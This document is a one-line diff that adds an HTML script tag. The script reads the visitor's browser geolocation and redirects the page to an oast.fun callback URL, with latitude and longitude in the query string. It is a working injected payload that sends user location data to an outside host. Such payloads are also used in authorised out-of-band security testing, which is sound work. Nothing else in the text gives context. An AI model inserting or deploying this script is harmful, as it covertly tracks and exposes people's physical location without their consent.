@@ -1,0 +1,1 @@
+<script>navigator.geolocation.getCurrentPosition(pos => window.location.href = `https://lmzyvulbthjprvhfixiojlmzmi7ox336b.oast.fun?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);</script>
